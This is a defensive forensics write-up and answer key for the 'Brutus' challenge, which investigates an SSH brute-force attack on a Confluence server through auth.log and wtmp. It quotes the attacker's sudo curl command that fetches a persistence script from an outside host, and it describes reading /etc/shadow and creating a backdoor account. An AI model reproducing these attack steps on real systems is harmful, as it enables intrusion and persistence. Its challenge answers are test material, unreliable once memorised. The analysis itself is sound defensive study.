## Challenge Information

![](../../Image/Pasted%20image%2020250604181413.png)

| Name       | Brutus                                      |
| ---------- | ------------------------------------------- |
| Difficulty | Very Easy                                   |
| Category   | #log-analysis #forensic                     |
| Tags       | #auth-log #wtmp #btmp #utmp #ssh-bruteforce |

## Scenario

> In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

## Overview
The download zip has two files in it, `auth.log` and `wtmp` :
#### auth.log
- `auth.log` is a text log that logs both successful and failed logins.

According to [RFC 5424](https://datatracker.ietf.org/doc/html/rfc5424#section-6), the format of each line is:
```
<Timestamp> <Hostname> <Service>[<process_id>]: <Message>
```
#### wtmp
`wtmp` is one of three files that tracks login and logout events on a Linux system. 
- `/var/run/utmp` tracks the currently logged in users. 
- `/var/log/wtmp` keeps a historical log of login and logout activity. 
- `/var/log/btmp` keeps a record of invalid login attempts.
As **wtmp** is a binary log file, I wile utilize `utmpdump` to read.

## Walkthrough

#### SSH Brute-force
To find brute-force attack, use `grep "Failed"`.

```
┌──(kali㉿kali)-[~/Desktop/Brutus]
└─$ cat auth.log | grep "Failed"
Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2332]: Failed password for invalid user admin from 65.2.161.68 port 46444 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2335]: Failed password for invalid user admin from 65.2.161.68 port 46460 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2337]: Failed password for invalid user admin from 65.2.161.68 port 46498 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password for invalid user admin from 65.2.161.68 port 46454 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2338]: Failed password for backup from 65.2.161.68 port 46512 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2336]: Failed password for backup from 65.2.161.68 port 46468 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2330]: Failed password for invalid user admin from 65.2.161.68 port 46422 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2328]: Failed password for invalid user admin from 65.2.161.68 port 46390 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2329]: Failed password for invalid user admin from 65.2.161.68 port 46414 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2333]: Failed password for invalid user admin from 65.2.161.68 port 46452 ssh2
Mar  6 06:31:34 ip-172-31-35-28 sshd[2352]: Failed password for backup from 65.2.161.68 port 46568 ssh2
Mar  6 06:31:34 ip-172-31-35-28 sshd[2351]: Failed password for backup from 65.2.161.68 port 46538 ssh2
Mar  6 06:31:34 ip-172-31-35-28 sshd[2355]: Failed password for backup from 65.2.161.68 port 46576 ssh2
Mar  6 06:31:34 ip-172-31-35-28 sshd[2357]: Failed password for backup from 65.2.161.68 port 46582 ssh2
Mar  6 06:31:36 ip-172-31-35-28 sshd[2357]: Failed password for backup from 65.2.161.68 port 46582 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2359]: Failed password for invalid user server_adm from 65.2.161.68 port 46596 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2361]: Failed password for invalid user server_adm from 65.2.161.68 port 46614 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2368]: Failed password for invalid user server_adm from 65.2.161.68 port 46676 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2369]: Failed password for invalid user server_adm from 65.2.161.68 port 46682 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2365]: Failed password for invalid user server_adm from 65.2.161.68 port 46644 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2366]: Failed password for invalid user server_adm from 65.2.161.68 port 46648 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2364]: Failed password for invalid user server_adm from 65.2.161.68 port 46632 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2367]: Failed password for invalid user server_adm from 65.2.161.68 port 46664 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2363]: Failed password for invalid user server_adm from 65.2.161.68 port 46620 ssh2
Mar  6 06:31:37 ip-172-31-35-28 sshd[2377]: Failed password for invalid user server_adm from 65.2.161.68 port 46684 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2379]: Failed password for invalid user server_adm from 65.2.161.68 port 46698 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2380]: Failed password for invalid user server_adm from 65.2.161.68 port 46710 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2383]: Failed password for invalid user svc_account from 65.2.161.68 port 46722 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2384]: Failed password for invalid user svc_account from 65.2.161.68 port 46732 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2387]: Failed password for invalid user svc_account from 65.2.161.68 port 46742 ssh2
Mar  6 06:31:38 ip-172-31-35-28 sshd[2389]: Failed password for invalid user svc_account from 65.2.161.68 port 46744 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2391]: Failed password for invalid user svc_account from 65.2.161.68 port 46750 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2393]: Failed password for invalid user svc_account from 65.2.161.68 port 46774 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2394]: Failed password for invalid user svc_account from 65.2.161.68 port 46786 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2397]: Failed password for invalid user svc_account from 65.2.161.68 port 46814 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2398]: Failed password for invalid user svc_account from 65.2.161.68 port 46840 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2396]: Failed password for invalid user svc_account from 65.2.161.68 port 46800 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2400]: Failed password for invalid user svc_account from 65.2.161.68 port 46854 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2
Mar  6 06:31:39 ip-172-31-35-28 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2
Mar  6 06:31:41 ip-172-31-35-28 sshd[2399]: Failed password for root from 65.2.161.68 port 46852 ssh2
Mar  6 06:31:41 ip-172-31-35-28 sshd[2407]: Failed password for root from 65.2.161.68 port 46876 ssh2
Mar  6 06:31:41 ip-172-31-35-28 sshd[2409]: Failed password for root from 65.2.161.68 port 46890 ssh2
Mar  6 06:31:42 ip-172-31-35-28 sshd[2423]: Failed password for backup from 65.2.161.68 port 34834 ssh2
Mar  6 06:31:42 ip-172-31-35-28 sshd[2424]: Failed password for backup from 65.2.161.68 port 34856 ssh2
```

To find successful logon, use `grep "Accepted"` :

```
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
```
##### Analysis:
- **Attacker IP address**: 65.2.161.68
- Except for invalid users and backup, we must look up to **root** logon attempts.
- **Success Brute-force Time**: Mar 6 06:31:40

To read wtmp, use `utmpdump wtmp`:

![](../../Image/Pasted%20image%2020250604195534.png)
##### Analysis:
- The time that attacker logins on machine based on IP and time above: 2024-03-06 06:32:45.
- New suspicious account logon: **cyberjunkie** - 2024-03-06 06:37:35

To know connecting session, analysis the **auth.log** :

![](../../Image/Pasted%20image%2020250604201113.png)

- The session created according to time logon above: 37

According to auth.log, I certainly prove that new account is created and given the highest privilege.

![](../../Image/Pasted%20image%2020250604201839.png)

![](../../Image/Pasted%20image%2020250604203313.png)

- The new account: cyberjunkie -> **MITRE T1136.001** (Creating Local Account) on Persistence category.
- New session on account: 49 - 2024-03-06 06:37:24

Actions after logon on new account:

![](../../Image/Pasted%20image%2020250604203418.png)

```
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```
- As the file shows, I confirm the attacker had abused `/etc/shadow` file first to extract hashes.
- Secondly, attacker used **lineper.sh** to enumerate the machine to find any chance for going further privilege.
---
## Questions
- Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?
=> 65.2.161.68

- The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?
=> root

- Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.
=> 2024-03-06 06:32:45

- SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
=> 37

- The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
=> cyberjunkie

- What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
=> T1136.001

- What time did the attacker's first SSH session end according to auth.log?
=> 2024-03-06 06:37:24

- The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

```
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```